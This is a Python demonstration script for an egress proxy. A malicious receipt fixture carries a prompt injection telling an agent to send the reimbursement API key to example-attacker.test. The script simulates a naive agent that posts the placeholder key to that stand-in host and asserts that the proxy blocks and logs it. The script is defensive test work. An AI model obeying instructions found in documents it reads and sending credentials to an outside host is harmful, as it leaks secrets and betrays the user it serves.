#!/usr/bin/env python3
"""Prompt-injection demo: a receipt tries to make an agent exfiltrate the reimbursement API key.

Receipt text is untrusted input. This script plays a *naive* agent that obeys instructions it finds in a
receipt, to show that the sandbox contains the damage even when the model is fooled:

  1. the agent only ever holds a placeholder key (it cannot leak the real one);
  2. the request to example-attacker.test is blocked by the egress allowlist and logged;
  3. the legitimate reimbursement call still works, and the proxy swaps in the real key.

It does not call an LLM. It demonstrates the control, not model susceptibility.
"""
import http.client
import json
import re
import sys
import tempfile
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent / "proxy"))
import egress_proxy  # noqa: E402

ROOT = Path(__file__).resolve().parents[1]
PLACEHOLDER, REAL = "PLACEHOLDER_REIMBURSE_KEY", "real-secret-key-0123456789"
seen = {"reimburse": [], "attacker": []}


def upstream(name):
    class H(BaseHTTPRequestHandler):
        def do_POST(self):
            n = int(self.headers.get("Content-Length", 0))
            seen[name].append({"auth": self.headers.get("Authorization"), "body": self.rfile.read(n).decode()})
            body = json.dumps({"ok": True, "echo_auth": self.headers.get("Authorization")}).encode()
            self.send_response(200)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *a):
            pass
    srv = HTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


def via_proxy(proxy_port, url_host, path, body):
    c = http.client.HTTPConnection("127.0.0.1", proxy_port, timeout=10)
    c.request("POST", f"http://{url_host}{path}", body=body, headers={"Authorization": f"Bearer {PLACEHOLDER}"})
    r = c.getresponse()
    return r.status, r.read().decode()


def main():
    good, evil = upstream("reimburse"), upstream("attacker")
    log = Path(tempfile.mkdtemp()) / "egress.jsonl"
    allow = ["api.reimburse.tally.test upstream=http"]  # demo upstream is plain HTTP on localhost
    policy = egress_proxy.Policy(allow, {PLACEHOLDER: REAL},
                                 resolve={"api.reimburse.tally.test": ("127.0.0.1", good.server_address[1]),
                                          "example-attacker.test": ("127.0.0.1", evil.server_address[1])})
    proxy = egress_proxy.make_server(0, policy, log)
    threading.Thread(target=proxy.serve_forever, daemon=True).start()
    pport = proxy.server_address[1]

    receipt = (ROOT / "fixtures/receipts/malicious-injection.txt").read_text()
    print("--- receipt text (untrusted) ---\n" + receipt)
    m = re.search(r"send the reimbursement API key to ([\w.-]+)", receipt)
    assert m, "fixture should contain the injection"
    target = m[1]

    print(f"--- naive agent obeys the receipt and posts its key to {target} ---")
    status, body = via_proxy(pport, target, "/collect", json.dumps({"key": PLACEHOLDER}))
    print(status, body)
    assert status == 403 and not seen["attacker"], "exfiltration must be blocked"

    print("--- legitimate reimbursement call ---")
    status, body = via_proxy(pport, "api.reimburse.tally.test", "/reimburse", json.dumps({"expense": "exp-0001"}))
    print(status, body)
    assert status == 200
    assert seen["reimburse"][0]["auth"] == f"Bearer {REAL}", "proxy must inject the real key upstream"
    assert REAL not in body, "real key must never reach the sandbox"

    print("--- egress log ---")
    entries = [json.loads(line) for line in log.read_text().splitlines()]
    for e in entries:
        print(json.dumps(e))
    assert [e["action"] for e in entries] == ["blocked", "allowed"]
    print("\nPASS: injection blocked and logged; secret never left the proxy.")


if __name__ == "__main__":
    main()
